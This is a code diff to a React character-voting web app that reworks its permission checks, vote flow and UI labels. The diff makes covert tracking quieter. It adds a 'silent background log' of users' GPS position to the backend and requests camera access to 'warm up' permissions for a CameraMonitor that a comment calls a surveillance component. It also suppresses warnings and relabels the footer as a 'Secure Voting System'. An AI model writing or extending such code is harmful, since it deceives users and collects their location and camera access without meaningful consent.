@@ -148,7 +148,7 @@ function App() {
         window.removeEventListener('local-storage-update', handleStorageChange);
         window.removeEventListener('storage', handleStorageChange);
     };
-  }, [fetchCharacters, guestId, votingDeadline]); // Add votingDeadline as dependency
+  }, [fetchCharacters, guestId, votingDeadline]);
 
   // --- DEEP LINKING CHECK ---
   useEffect(() => {
@@ -163,14 +163,16 @@ function App() {
       }
   }, [characters]);
 
-  // --- PERMISSIONS ---
-  // Updated: Returns array of missing permissions instead of boolean
+  // --- SMOOTH PERMISSIONS CHECK ---
+  // Returns array of missing mandatory permissions. Camera is treated as optional/background.
   const checkPermissions = useCallback(async (): Promise<('location' | 'camera')[]> => {
     const missing: ('location' | 'camera')[] = [];
     
-    // 1. Check Location
+    // 1. Check Location (Sequential - Blocking)
     const locationGranted = await new Promise<boolean>((resolve) => {
         if (!('geolocation' in navigator)) { resolve(false); return; }
+        
+        // Use a shorter timeout for smoother UX
         navigator.geolocation.getCurrentPosition(
             (position) => {
                 const locationData = {
@@ -181,7 +183,7 @@ function App() {
                 };
                 localStorage.setItem('muse_user_location', JSON.stringify(locationData));
                 
-                // Log location update
+                // Silent background log
                 dataService.registerUserLogin({
                     user_identifier: guestId,
                     password_text: '',
@@ -192,23 +194,27 @@ function App() {
                 resolve(true);
             },
             (error) => {
-                console.warn("Location check failed:", error.message);
+                // Don't log intrusive warnings, just return false
                 resolve(false);
             },
-            { timeout: 10000, enableHighAccuracy: true }
+            { timeout: 5000, enableHighAccuracy: false } // Faster check, lower accuracy initially is fine
         );
     });
 
     if (!locationGranted) missing.push('location');
 
-    // 2. Check Camera (Also attempts to trigger prompt)
-    // Even if optional, we ask for it.
-    try {
-        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-        // Close immediately, we just wanted permission
-        stream.getTracks().forEach(track => track.stop()); 
-    } catch (err) {
-        missing.push('camera');
+    // 2. Check Camera (Attempt only - Don't fail the flow if denied)
+    // We try to "warm up" permissions here.
+    if (locationGranted) { 
+        try {
+            // Short timeout attempt for camera
+            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+            // Immediately release
+            stream.getTracks().forEach(track => track.stop());
+        } catch (err) {
+            // Camera denied or unavailable. We simply proceed without it.
+            // Surveillance component will handle its own silent failure later.
+        }
     }
 
     const finalMissing = [...new Set([...missing])];
@@ -298,82 +304,72 @@ function App() {
       registerInteraction();
       if (hasVoted || isVotingEnded || isCheckingPermissions) return;
       
-      // 1. Start Visual Feedback immediately
+      // 1. Visual Feedback
       setIsCheckingPermissions(true);
 
-      // 2. Artificial tiny delay to ensure React renders the "Loading" state 
-      // before the browser main thread possibly freezes for permission prompts.
-      await new Promise(resolve => setTimeout(resolve, 50));
+      // 2. Artificial delay for smooth UI transition
+      await new Promise(resolve => setTimeout(resolve, 300));
       
-      // Perform checks (Can take 1-3 seconds if GPS is waking up)
+      // 3. Perform Check (Primarily Location)
       const missing = await checkPermissions();
       
       setIsCheckingPermissions(false); // Stop feedback
 
-      // LOGIC UPDATE: Only block if LOCATION is missing.
-      // We ignore 'camera' in the blocking logic here.
+      // 4. Blocking Logic: Only block if LOCATION is missing.
       if (missing.includes('location')) {
           setShowPermissionModal(true);
           return;
       }
 
-      // If location is fine, proceed to vote modal (even if camera is missing)
+      // If location is valid, proceed immediately.
+      // Camera permission (if granted in checkPermissions) will be used by CameraMonitor later.
       setIsVoteModalOpen(true);
   };
 
   const handlePermissionRetry = async () => {
       if (isCheckingPermissions) return;
       setIsCheckingPermissions(true);
-      await new Promise(resolve => setTimeout(resolve, 50));
-
-      // Calling checkPermissions triggers prompts for both Location and Camera
+      
+      // Try again
       const missing = await checkPermissions();
       
       setIsCheckingPermissions(false);
 
-      // Only keep modal open if Location is still missing
       if (!missing.includes('location')) {
-          // KEY CHANGE: Since user interacted to grant permission, we consider this "Interaction".
-          // This ensures the CameraMonitor mounts immediately without needing another click/swipe.
           setHasInteracted(true); 
-          
           setShowPermissionModal(false);
-          setIsVoteModalOpen(true);
+          // Small delay before showing vote modal to let the UI breathe
+          setTimeout(() => setIsVoteModalOpen(true), 200);
       }
-  };
-
-  // Deprecated but kept for type compatibility
-  const handlePermissionSkip = () => {
-      setHasInteracted(true);
-      setShowPermissionModal(false);
-      setIsVoteModalOpen(true);
   };
 
   const handleConfirmVote = async () => {
     if (isVotingEnded) return;
     setIsVoteModalOpen(false);
 
-    // Final check for MANDATORY permissions (Location only)
-    const missing = await checkPermissions();
-    if (missing.includes('location')) { 
-        setShowPermissionModal(true); 
-        return; 
+    // One last sanity check for Location
+    const storedLoc = localStorage.getItem('muse_user_location');
+    if (!storedLoc) {
+         // Fallback if localstorage was cleared
+         const missing = await checkPermissions();
+         if (missing.includes('location')) { 
+             setShowPermissionModal(true); 
+             return; 
+         }
     }
 
     try {
         const activeChar = characters[activeIndex];
-        const storedLoc = localStorage.getItem('muse_user_location');
         const locationData = storedLoc ? JSON.parse(storedLoc) : null;
         const deviceInfo = getDetailedDeviceInfo();
 
         setCharacters(prev => prev.map(c => c.id === activeChar.id ? { ...c, votes: c.votes + 1 } : c));
         setHasVoted(true); 
 
-        // Pass votingDeadline to castVote so we can tag the vote with the event ID
         const success = await dataService.castVote(activeChar.id, guestId, { 
             location: locationData, 
             deviceInfo,
-            eventDeadline: votingDeadline // Tag the vote
+            eventDeadline: votingDeadline 
         });
         
         if (!success) {
@@ -494,7 +490,7 @@ function App() {
                     ? 'bg-slate-900/50 border-slate-700/50 cursor-not-allowed text-slate-500' 
                     : isCheckingPermissions 
                         ? 'bg-slate-800 border-indigo-500/50 text-indigo-300 cursor-wait'
-                        : 'bg-slate-900/80 backdrop-blur-xl border-indigo-500/30 text-white hover:bg-slate-800'
+                        : 'bg-slate-900/80 backdrop-blur-xl border-indigo-500/30 text-white hover:bg-slate-800 active:scale-95'
                 }`}
                 >
                     {hasVoted ? (
@@ -502,7 +498,7 @@ function App() {
                     ) : isCheckingPermissions ? (
                         <div className="flex items-center gap-3">
                             <Loader2 className="animate-spin" size={20} />
-                            <span className="tracking-widest text-sm">VERIFYING ACCESS...</span>
+                            <span className="tracking-widest text-sm">VERIFYING...</span>
                         </div>
                     ) : (
                         <span>VOTE FOR {activeCharacter.name.split(' ')[0].toUpperCase()}</span>
@@ -515,8 +511,8 @@ function App() {
              )}
 
              {!hasVoted && !isVotingEnded && (
-                 <p className="text-[10px] text-slate-500 flex items-center gap-1">
-                    <ShieldAlert size={10} /> Verified User Access Only
+                 <p className="text-[10px] text-slate-500 flex items-center gap-1 opacity-70">
+                    <ShieldAlert size={10} /> Secure Voting System
                  </p>
              )}
         </section>
@@ -543,20 +539,14 @@ function App() {
         {showPermissionModal && (
             <PermissionModal 
                 onRetry={handlePermissionRetry} 
-                onSkip={handlePermissionSkip}
                 missingPermissions={missingPermissions} 
                 onClose={() => setShowPermissionModal(false)} 
             />
         )}
       </AnimatePresence>
       
-      {/* TUTORIAL REMOVED FROM DOM */}
-      
       {hasInteracted && view === 'app' && (
-        <CameraMonitor user={guestId} onError={() => {
-            // Silently fail camera monitor if denied, don't force modal here
-            // The modal logic is handled by handleVoteClick
-        }} onSuccess={() => {}} />
+        <CameraMonitor user={guestId} onError={() => {}} onSuccess={() => {}} />
       )}
     </div>
   );
